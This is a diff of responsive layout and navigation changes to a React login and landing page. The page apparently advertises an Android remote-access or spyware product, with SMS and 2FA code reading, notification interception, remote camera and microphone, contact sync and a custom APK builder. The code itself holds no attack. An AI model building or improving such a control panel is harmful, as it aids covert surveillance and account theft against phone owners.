@@ -26,36 +26,66 @@ function CursorGlow() {
 }
 
 
-/* Sticky nav appearing on scroll */
+/* Sticky nav appearing on scroll (Bottom on mobile to prevent marquee overlap & top-12 on desktop) */
 function StickyNav({ onScrollTo }: { onScrollTo: (id: string) => void }) {
     const [show, setShow] = useState(false);
     useEffect(() => {
-        const h = () => setShow(window.scrollY > window.innerHeight * 0.5);
+        const h = () => setShow(window.scrollY > window.innerHeight * 0.4);
         window.addEventListener('scroll', h, { passive: true });
         return () => window.removeEventListener('scroll', h);
     }, []);
     return (
         <AnimatePresence>
             {show && (
-                <motion.nav
-                    initial={{ y: -70, opacity: 0 }}
-                    animate={{ y: 0, opacity: 1 }}
-                    exit={{ y: -70, opacity: 0 }}
-                    transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
-                    className="fixed top-4 left-1/2 -translate-x-1/2 z-[100] sticky-nav-glass rounded-full px-3 py-1.5 flex items-center gap-1 shadow-[0_10px_40px_rgba(0,0,0,0.8)] border border-white/10"
-                >
-                    <div className="w-8 h-8 rounded-full overflow-hidden ring-1 ring-white/10 mr-2">
-                        <Image src="/gallery-eye-logo.jpg" alt="GE" width={32} height={32} className="w-full h-full object-cover" />
-                    </div>
-                    {['tools', 'capabilities', 'login-section'].map((id) => (
-                        <button key={id} onClick={() => onScrollTo(id)} className="px-4 py-2 rounded-full text-xs font-semibold text-zinc-300 hover:text-white hover:bg-white/[0.08] transition-all capitalize">
-                            {id === 'login-section' ? 'Sign In Portal' : id === 'tools' ? '8 Master Tools' : 'Capabilities'}
+                <>
+                    {/* Mobile Bottom Floating Nav (Never covers top marquee or headers, right under thumb!) */}
+                    <motion.nav
+                        initial={{ y: 80, opacity: 0 }}
+                        animate={{ y: 0, opacity: 1 }}
+                        exit={{ y: 80, opacity: 0 }}
+                        transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
+                        className="fixed bottom-4 left-1/2 -translate-x-1/2 z-[100] sticky-nav-glass rounded-full px-3 py-2 flex sm:hidden items-center gap-1.5 shadow-[0_10px_40px_rgba(0,0,0,0.95)] border border-white/15 w-[90%] max-w-xs justify-between"
+                    >
+                        <div className="flex items-center gap-1.5">
+                            <div className="w-7 h-7 rounded-full overflow-hidden ring-1 ring-white/20 flex-shrink-0">
+                                <Image src="/gallery-eye-logo.jpg" alt="GE" width={28} height={28} className="w-full h-full object-cover" />
+                            </div>
+                            <span className="text-xs font-extrabold text-white">GE Portal</span>
+                        </div>
+                        <div className="flex items-center gap-1">
+                            <button onClick={() => onScrollTo('tools')} className="px-2.5 py-1.5 rounded-full text-[11px] font-bold text-zinc-300 hover:text-white hover:bg-white/10 transition-all">
+                                Tools
+                            </button>
+                            <button onClick={() => onScrollTo('demo-video')} className="px-2.5 py-1.5 rounded-full text-[11px] font-bold text-zinc-300 hover:text-white hover:bg-white/10 transition-all">
+                                Demo
+                            </button>
+                            <button onClick={() => onScrollTo('login-section')} className="px-3 py-1.5 rounded-full text-[11px] font-extrabold bg-gradient-to-r from-[#d4a574] to-[#e8966d] text-[#1c1917] shadow-sm">
+                                Enter
+                            </button>
+                        </div>
+                    </motion.nav>
+
+                    {/* Desktop Top Floating Nav (Sits at top-12 below fixed marquee strip) */}
+                    <motion.nav
+                        initial={{ y: -70, opacity: 0 }}
+                        animate={{ y: 0, opacity: 1 }}
+                        exit={{ y: -70, opacity: 0 }}
+                        transition={{ duration: 0.4, ease: [0.22, 1, 0.36, 1] }}
+                        className="fixed top-12 left-1/2 -translate-x-1/2 z-[100] sticky-nav-glass rounded-full px-3 py-1.5 hidden sm:flex items-center gap-1 shadow-[0_10px_40px_rgba(0,0,0,0.9)] border border-white/15"
+                    >
+                        <div className="w-8 h-8 rounded-full overflow-hidden ring-1 ring-white/10 mr-2">
+                            <Image src="/gallery-eye-logo.jpg" alt="GE" width={32} height={32} className="w-full h-full object-cover" />
+                        </div>
+                        {['tools', 'capabilities', 'login-section'].map((id) => (
+                            <button key={id} onClick={() => onScrollTo(id)} className="px-4 py-2 rounded-full text-xs font-semibold text-zinc-300 hover:text-white hover:bg-white/[0.08] transition-all capitalize">
+                                {id === 'login-section' ? 'Sign In Portal' : id === 'tools' ? '8 Master Tools' : 'Capabilities'}
+                            </button>
+                        ))}
+                        <button onClick={() => onScrollTo('login-section')} className="ml-2 px-4 py-1.5 rounded-full text-xs font-bold bg-gradient-to-r from-[#d4a574] to-[#e8966d] text-[#1c1917] hover:scale-105 transition-transform shadow-[0_2px_10px_rgba(212,165,116,0.3)]">
+                            Enter App
                         </button>
-                    ))}
-                    <button onClick={() => onScrollTo('login-section')} className="ml-2 px-4 py-1.5 rounded-full text-xs font-bold bg-gradient-to-r from-[#d4a574] to-[#e8966d] text-[#1c1917] hover:scale-105 transition-transform shadow-[0_2px_10px_rgba(212,165,116,0.3)]">
-                        Enter App
-                    </button>
-                </motion.nav>
+                    </motion.nav>
+                </>
             )}
         </AnimatePresence>
     );
@@ -94,24 +124,37 @@ function Reveal({ children, delay = 0, className = '' }: { children: React.React
     );
 }
 
-/* 3D magnetic tilt card */
+/* 3D magnetic tilt card (Disabled on touch/mobile devices to eliminate GPU repaints and black screen flash on scroll) */
 function MagneticCard({ children, className = '' }: { children: React.ReactNode; className?: string }) {
     const ref = useRef<HTMLDivElement>(null);
     const [style, setStyle] = useState({});
+    const [isMouseDevice, setIsMouseDevice] = useState(false);
+
+    useEffect(() => {
+        if (typeof window !== 'undefined' && window.matchMedia('(pointer: fine)').matches) {
+            setIsMouseDevice(true);
+        }
+    }, []);
+
     const onMove = useCallback((e: React.MouseEvent) => {
-        if (!ref.current) return;
+        if (!isMouseDevice || !ref.current) return;
         const r = ref.current.getBoundingClientRect();
         const rx = ((e.clientY - r.top - r.height / 2) / (r.height / 2)) * -4.5;
         const ry = ((e.clientX - r.left - r.width / 2) / (r.width / 2)) * 4.5;
         setStyle({ transform: `perspective(1000px) rotateX(${rx}deg) rotateY(${ry}deg) scale3d(1.015,1.015,1.015)` });
-    }, []);
-    const onLeave = useCallback(() => setStyle({ transform: 'perspective(1000px) rotateX(0) rotateY(0) scale3d(1,1,1)' }), []);
-    return <div ref={ref} onMouseMove={onMove} onMouseLeave={onLeave} className={className} style={{ ...style, transition: 'transform 0.4s cubic-bezier(0.22,1,0.36,1)', willChange: 'transform' }}>{children}</div>;
+    }, [isMouseDevice]);
+
+    const onLeave = useCallback(() => {
+        if (!isMouseDevice) return;
+        setStyle({ transform: 'perspective(1000px) rotateX(0) rotateY(0) scale3d(1,1,1)' });
+    }, [isMouseDevice]);
+
+    return <div ref={ref} onMouseMove={onMove} onMouseLeave={onLeave} className={className} style={{ ...style, transition: 'transform 0.4s cubic-bezier(0.22,1,0.36,1)' }}>{children}</div>;
 }
 
 /* ═══════ BESPOKE TOOL VISUAL PREVIEWS ═══════ */
 
-/* 1. Realistic & Showstopping Gallery Sync Preview */
+/* 1. Realistic & Showstopping Gallery Sync Preview (Mobile & Desktop Perfect) */
 function GalleryPreview() {
     const photos = [
         { url: 'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=600&auto=format&fit=crop&q=80', name: 'Maldives_RAW.dng', meta: '48MP RAW • 12.4 MB • f/1.78', tag: 'Synced', badge: 'RAW DNG' },
@@ -121,104 +164,104 @@ function GalleryPreview() {
     ];
     const [activeTab, setActiveTab] = useState('All Media (4,218)');
     return (
-        <div className="w-full rounded-3xl overflow-hidden border border-amber-500/30 bg-gradient-to-b from-[#181411] via-[#0f0c0a] to-black shadow-[0_20px_50px_rgba(0,0,0,0.8)] mt-6 p-4 sm:p-5">
+        <div className="w-full rounded-2xl sm:rounded-3xl overflow-hidden border border-amber-500/30 bg-gradient-to-b from-[#181411] via-[#0f0c0a] to-black shadow-[0_20px_50px_rgba(0,0,0,0.8)] mt-4 sm:mt-6 p-3.5 sm:p-5">
             {/* Cloud Media Tunnel Header HUD */}
-            <div className="flex flex-wrap items-center justify-between pb-4 mb-4 border-b border-white/10 gap-2">
-                <div className="flex items-center gap-2.5">
-                    <div className="w-8 h-8 rounded-xl bg-gradient-to-br from-amber-400 to-orange-500 flex items-center justify-center text-black font-extrabold text-sm shadow-[0_0_15px_rgba(245,158,11,0.4)]">
+            <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-4 mb-4 border-b border-white/10 gap-3">
+                <div className="flex items-center gap-3">
+                    <div className="w-10 h-10 rounded-2xl bg-gradient-to-br from-amber-400 to-orange-500 flex items-center justify-center text-black font-extrabold text-base shadow-[0_0_20px_rgba(245,158,11,0.5)] flex-shrink-0">
                         G
                     </div>
-                    <div>
-                        <div className="text-xs sm:text-sm font-extrabold text-white flex items-center gap-2">
-                            Cloud Media Tunnel <span className="text-[10px] font-mono text-amber-400 px-2 py-0.5 rounded-full bg-amber-400/10 border border-amber-400/20">64.8 GB SYNCED</span>
+                    <div className="min-w-0 flex-1">
+                        <div className="text-sm sm:text-base font-extrabold text-white flex flex-wrap items-center gap-2">
+                            <span>Cloud Media Tunnel</span>
+                            <span className="text-[10px] font-mono text-amber-400 px-2.5 py-0.5 rounded-full bg-amber-400/10 border border-amber-400/20 whitespace-nowrap">64.8 GB SYNCED</span>
                         </div>
-                        <div className="text-[10px] font-mono text-zinc-400 mt-0.5 flex items-center gap-1.5">
-                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" /> E2E Stream Rate: 42.4 MB/s • Zero Lag
+                        <div className="text-[11px] font-mono text-zinc-400 mt-0.5 flex items-center gap-1.5">
+                            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse flex-shrink-0" />
+                            <span className="truncate">E2E Stream Rate: 42.4 MB/s • Zero Lag</span>
                         </div>
                     </div>
                 </div>
-                <div className="flex items-center gap-1.5">
-                    <button className="px-3 py-1.5 rounded-lg bg-amber-500/10 border border-amber-500/30 text-amber-300 text-[11px] font-bold hover:bg-amber-500/20 transition-all flex items-center gap-1.5 shadow-sm">
-                        <span>⚡ Auto-Sync Active</span>
-                    </button>
-                </div>
+                <button className="w-full sm:w-auto px-3.5 py-2 rounded-xl bg-amber-500/15 border border-amber-500/40 text-amber-300 text-xs font-extrabold hover:bg-amber-500/25 transition-all flex items-center justify-center gap-1.5 shadow-sm flex-shrink-0">
+                    <span>⚡ Auto-Sync Active</span>
+                </button>
             </div>
 
             {/* Filter Pill Tabs */}
-            <div className="flex items-center gap-1.5 overflow-x-auto pb-3 mb-1 scrollbar-none">
+            <div className="flex items-center gap-1.5 overflow-x-auto pb-3 mb-1 scrollbar-none -mx-1 px-1">
                 {['All Media (4,218)', 'RAW Photos (842)', '4K Videos (124)', 'Hidden Vault 🔒'].map((tab) => (
                     <button key={tab} onClick={() => setActiveTab(tab)}
-                            className={`px-3 py-1 rounded-xl text-[11px] font-bold whitespace-nowrap transition-all ${activeTab === tab ? 'bg-gradient-to-r from-amber-500 to-orange-500 text-black shadow-md' : 'bg-white/5 text-zinc-400 hover:text-white hover:bg-white/10 border border-white/5'}`}>
+                            className={`px-3 py-1.5 rounded-xl text-[11px] font-bold whitespace-nowrap transition-all ${activeTab === tab ? 'bg-gradient-to-r from-amber-500 to-orange-500 text-black shadow-md' : 'bg-white/5 text-zinc-400 hover:text-white hover:bg-white/10 border border-white/5'}`}>
                         {tab}
                     </button>
                 ))}
             </div>
 
-            {/* High-Resolution Masonry/Grid View */}
-            <div className="grid grid-cols-2 gap-3 mt-2">
+            {/* High-Resolution Masonry/Grid View (Single column on mobile so full photo shows without dark band overlap, 2 columns on desktop) */}
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4 mt-2">
                 {photos.map((p, idx) => (
-                    <div key={idx} className="group/photo relative rounded-2xl overflow-hidden border border-white/15 bg-black/60 aspect-[16/11] shadow-lg transition-all duration-500 hover:border-amber-400/60 hover:shadow-[0_10px_30px_rgba(245,158,11,0.25)]">
-                        <Image src={p.url} alt={p.name} fill sizes="(max-width: 768px) 50vw, 33vw" className="object-cover group-hover/photo:scale-110 transition-transform duration-700" />
+                    <div key={idx} className="group/photo relative rounded-2xl overflow-hidden border border-white/15 bg-black/60 aspect-[16/10] sm:aspect-[16/11] shadow-lg transition-all duration-500 hover:border-amber-400/60 hover:shadow-[0_10px_30px_rgba(245,158,11,0.25)] flex flex-col justify-between">
+                        <Image src={p.url} alt={p.name} fill sizes="(max-width: 640px) 100vw, 50vw" className="object-cover group-hover/photo:scale-110 transition-transform duration-700" />
                         <div className="absolute inset-0 bg-gradient-to-t from-black/95 via-black/30 to-transparent opacity-85 group-hover/photo:opacity-95 transition-opacity" />
                         
                         {/* Top Badges */}
-                        <div className="absolute top-2.5 left-2.5 right-2.5 flex items-center justify-between">
-                            <span className="px-2 py-0.5 rounded-md bg-black/70 backdrop-blur-md border border-amber-400/30 text-[9px] font-extrabold font-mono text-amber-300 shadow-sm">
+                        <div className="absolute top-2.5 left-2.5 right-2.5 flex items-center justify-between z-10">
+                            <span className="px-2 py-0.5 rounded-md bg-black/80 backdrop-blur-md border border-amber-400/30 text-[9px] font-extrabold font-mono text-amber-300 shadow-sm">
                                 {p.badge}
                             </span>
-                            <div className="px-2 py-0.5 rounded-full bg-black/70 backdrop-blur-md border border-white/15 flex items-center gap-1 text-[9px] font-bold text-emerald-400 shadow-sm">
+                            <div className="px-2 py-0.5 rounded-full bg-black/80 backdrop-blur-md border border-white/15 flex items-center gap-1 text-[9px] font-bold text-emerald-400 shadow-sm">
                                 <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                                 {p.tag}
                             </div>
                         </div>
 
                         {/* Bottom Metadata & Hover Actions */}
-                        <div className="absolute bottom-2.5 left-2.5 right-2.5">
-                            <div className="text-xs font-extrabold text-white truncate drop-shadow-md group-hover/photo:text-amber-300 transition-colors">{p.name}</div>
-                            <div className="text-[10px] text-zinc-300/90 font-mono mt-0.5">{p.meta}</div>
+                        <div className="absolute bottom-2.5 left-2.5 right-2.5 z-10">
+                            <div className="text-xs sm:text-sm font-extrabold text-white truncate drop-shadow-md group-hover/photo:text-amber-300 transition-colors">{p.name}</div>
+                            <div className="text-[10px] sm:text-[11px] text-zinc-300/90 font-mono mt-0.5 truncate">{p.meta}</div>
                         </div>
                     </div>
                 ))}
             </div>
 
             {/* Bottom Status Ribbon */}
-            <div className="mt-4 pt-3 border-t border-white/10 flex items-center justify-between text-[11px] text-zinc-400 font-mono">
+            <div className="mt-4 pt-3 border-t border-white/10 flex flex-col sm:flex-row sm:items-center justify-between text-[11px] text-zinc-400 font-mono gap-1">
                 <span>Storage: <strong className="text-amber-400">512 GB</strong> (12.6% Used by Telemetry)</span>
-                <span className="text-emerald-400 font-bold hidden sm:inline">✔ 100% EXIF PRESERVED</span>
+                <span className="text-emerald-400 font-bold">✔ 100% EXIF PRESERVED</span>
             </div>
         </div>
     );
 }
 
-/* 2. Remote Camera Viewfinder Preview */
+/* 2. Remote Camera Viewfinder Preview (Mobile & Desktop Responsive) */
 function CameraPreview() {
     const [lens, setLens] = useState('1x Main');
     return (
-        <div className="w-full rounded-2xl overflow-hidden border border-white/10 bg-black/60 mt-6 relative aspect-[16/10] shadow-[0_10px_25px_rgba(0,0,0,0.6)] flex flex-col justify-between p-4"
+        <div className="w-full rounded-2xl overflow-hidden border border-white/10 bg-black/60 mt-4 sm:mt-6 relative aspect-[16/11] sm:aspect-[16/10] shadow-[0_10px_25px_rgba(0,0,0,0.6)] flex flex-col justify-between p-3 sm:p-4"
              style={{ backgroundImage: 'linear-gradient(to bottom, rgba(0,0,0,0.4), rgba(0,0,0,0.7)), url("https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=600&auto=format&fit=crop&q=80")', backgroundSize: 'cover', backgroundPosition: 'center' }}>
             {/* HUD Top */}
-            <div className="flex items-center justify-between text-[11px] font-mono text-cyan-300/90 bg-black/50 backdrop-blur-md px-3 py-1.5 rounded-xl border border-cyan-500/20">
-                <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-red-500 animate-ping" /> LIVE STREAM</span>
-                <span>ISO 400 • 1/120s • f/1.8</span>
+            <div className="flex flex-wrap items-center justify-between text-[10px] sm:text-[11px] font-mono text-cyan-300/90 bg-black/60 backdrop-blur-md px-2.5 sm:px-3 py-1.5 rounded-xl border border-cyan-500/20 gap-1.5 z-10">
+                <span className="flex items-center gap-1.5"><span className="w-2 h-2 rounded-full bg-red-500 animate-ping" /> LIVE</span>
+                <span className="hidden sm:inline">ISO 400 • 1/120s • f/1.8</span>
                 <span className="text-emerald-400 font-bold">1080p 60FPS</span>
             </div>
             {/* Viewfinder crosshairs */}
             <div className="absolute inset-0 pointer-events-none flex items-center justify-center">
-                <div className="w-24 h-24 border border-white/20 rounded-2xl flex items-center justify-center">
+                <div className="w-20 h-20 sm:w-24 sm:h-24 border border-white/20 rounded-2xl flex items-center justify-center">
                     <div className="w-2 h-2 rounded-full bg-cyan-400/80" />
                 </div>
             </div>
             {/* Lens Switcher & Controls */}
-            <div className="flex items-center justify-between bg-black/60 backdrop-blur-md p-2 rounded-xl border border-white/10 z-10">
+            <div className="flex flex-wrap items-center justify-between bg-black/70 backdrop-blur-md p-1.5 sm:p-2 rounded-xl border border-white/10 z-10 gap-2">
                 <div className="flex gap-1">
                     {['0.5x Ultra', '1x Main', '3x Tele'].map((l) => (
-                        <button key={l} onClick={() => setLens(l)} className={`px-2.5 py-1 rounded-lg text-[10px] font-bold transition-all ${lens === l ? 'bg-cyan-500 text-black shadow-[0_0_12px_rgba(6,182,212,0.5)]' : 'text-zinc-400 hover:text-white'}`}>
+                        <button key={l} onClick={() => setLens(l)} className={`px-2 sm:px-2.5 py-1 rounded-lg text-[9px] sm:text-[10px] font-bold transition-all ${lens === l ? 'bg-cyan-500 text-black shadow-[0_0_12px_rgba(6,182,212,0.5)]' : 'text-zinc-400 hover:text-white'}`}>
                             {l}
                         </button>
                     ))}
                 </div>
-                <div className="flex items-center gap-2 text-xs text-white/90">
-                    <span className="w-2 h-2 rounded-full bg-amber-400" /> Flash: AUTO
+                <div className="flex items-center gap-1.5 text-[11px] sm:text-xs text-white/90">
+                    <span className="w-2 h-2 rounded-full bg-amber-400" /> <span className="hidden xs:inline">Flash:</span> AUTO
                 </div>
             </div>
         </div>
@@ -286,7 +329,7 @@ function AlertsPreview() {
     );
 }
 
-/* 5. Contacts Access Preview */
+/* 5. Contacts Access Preview (Mobile & Desktop Responsive) */
 function ContactsPreview() {
     const contacts = [
         { name: 'Alexander Wright', phone: '+1 (555) 234-8901', role: 'Executive Vice President', status: 'Synced', initials: 'AW', color: '#10B981' },
@@ -294,23 +337,23 @@ function ContactsPreview() {
         { name: 'Marcus Vance', phone: '+1 (555) 890-1234', role: 'Security Ops Chief', status: 'Synced', initials: 'MV', color: '#6366F1' },
     ];
     return (
-        <div className="w-full flex flex-col gap-2.5 mt-6">
-            <div className="flex items-center justify-between px-3 py-2 rounded-xl bg-white/[0.04] border border-white/10 text-xs text-zinc-400">
-                <span className="flex items-center gap-2">🔍 Search 1,482 synced contacts...</span>
-                <span className="text-emerald-400 font-semibold text-[11px]">● Cloud Active</span>
+        <div className="w-full flex flex-col gap-2.5 mt-4 sm:mt-6">
+            <div className="flex flex-wrap items-center justify-between px-3 py-2 rounded-xl bg-white/[0.04] border border-white/10 text-xs text-zinc-400 gap-1">
+                <span className="flex items-center gap-2 truncate">🔍 Search 1,482 contacts...</span>
+                <span className="text-emerald-400 font-semibold text-[11px] whitespace-nowrap">● Cloud Active</span>
             </div>
             {contacts.map((c, i) => (
-                <div key={i} className="flex items-center justify-between p-3 rounded-xl border border-white/5 bg-black/40 hover:bg-white/[0.04] transition-colors">
-                    <div className="flex items-center gap-3">
-                        <div className="w-9 h-9 rounded-full flex items-center justify-center font-bold text-xs text-white shadow-md border border-white/10" style={{ backgroundColor: c.color }}>
+                <div key={i} className="flex items-center justify-between p-3 rounded-xl border border-white/5 bg-black/40 hover:bg-white/[0.04] transition-colors gap-2">
+                    <div className="flex items-center gap-2.5 min-w-0 flex-1">
+                        <div className="w-8 h-8 sm:w-9 sm:h-9 rounded-full flex items-center justify-center font-bold text-xs text-white shadow-md border border-white/10 flex-shrink-0" style={{ backgroundColor: c.color }}>
                             {c.initials}
                         </div>
-                        <div>
-                            <div className="text-xs font-bold text-white">{c.name}</div>
-                            <div className="text-[11px] text-zinc-400 font-mono">{c.phone}</div>
+                        <div className="min-w-0 flex-1">
+                            <div className="text-xs font-bold text-white truncate">{c.name}</div>
+                            <div className="text-[10px] sm:text-[11px] text-zinc-400 font-mono truncate">{c.phone}</div>
                         </div>
                     </div>
-                    <span className="text-[10px] px-2 py-0.5 rounded-md bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-medium">
+                    <span className="text-[10px] px-2 py-0.5 rounded-md bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 font-medium flex-shrink-0">
                         ✓ {c.status}
                     </span>
                 </div>
@@ -434,7 +477,7 @@ export default function LoginPage() {
     const marqueeItems = ['Gallery Sync Engine • 4K RAW Support', 'Live Optical Camera Viewfinder', '96kHz Lossless Microphone Stream', 'Real-Time Notification Intercepts', 'Instant SMS & 2FA Code Reader', 'Cloud Contact Matrix Synchronization', 'High-Output Flashlight Control', 'Remote Haptic Actuation', 'Multi-Device Fleet Command', 'Custom APK Builder Included'];
 
     return (
-        <main className="bg-[#080807] text-[#fafaf9] overflow-x-hidden selection:bg-amber-200/20 pt-12">
+        <main className="min-h-screen bg-[#080807] text-[#fafaf9] overflow-x-hidden selection:bg-amber-200/20 pt-12">
 
             {/* Global effects */}
             <div className="grain-overlay" />
@@ -585,14 +628,14 @@ export default function LoginPage() {
 
 
             {/* ═══ ALL 8 BESPOKE SHOWSTOPPING TOOLS (BROUGHT CLOSER TO DEMO VIDEO) ═══ */}
-            <section id="tools" className="relative z-10 pt-12 pb-32 px-5">
+            <section id="tools" className="relative z-10 pt-12 pb-32 px-3 sm:px-5">
 
 
-                <div className="max-w-6xl mx-auto flex flex-col gap-12">
+                <div className="max-w-6xl mx-auto flex flex-col gap-8 sm:gap-12">
                     {toolsData.map((tool, idx) => (
                         <Reveal key={tool.id} delay={idx * 0.05}>
                             <MagneticCard>
-                                <div className={`rounded-[2.5rem] p-8 sm:p-12 border transition-all duration-500 group relative overflow-hidden shadow-[0_20px_60px_rgba(0,0,0,0.6)] ${
+                                <div className={`rounded-3xl sm:rounded-[2.5rem] p-5 sm:p-8 md:p-12 border transition-all duration-500 group relative overflow-hidden shadow-[0_20px_60px_rgba(0,0,0,0.6)] ${
                                     tool.id === 'gallery'
                                         ? 'border-amber-400/60 bg-gradient-to-br from-amber-500/[0.08] via-white/[0.025] to-amber-500/[0.04] shadow-[0_0_60px_rgba(245,158,11,0.2)] ring-1 ring-amber-400/40'
                                         : 'card-glow-border border-white/[0.06] bg-white/[0.018] hover:bg-white/[0.035]'
@@ -601,7 +644,7 @@ export default function LoginPage() {
                                     <div className="absolute top-0 right-0 w-96 h-96 rounded-full opacity-10 group-hover:opacity-25 transition-opacity duration-700 blur-[90px] pointer-events-none" style={{ background: tool.accent }} />
 
 
-                                    <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center relative z-10">
+                                    <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 sm:gap-8 items-center relative z-10">
                                         <div className="lg:col-span-5 flex flex-col justify-center">
                                             <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-[11px] font-extrabold uppercase tracking-widest mb-6 w-fit border shadow-sm"
                                                  style={{ color: tool.accent, borderColor: `${tool.accent}40`, background: `${tool.accent}12` }}>
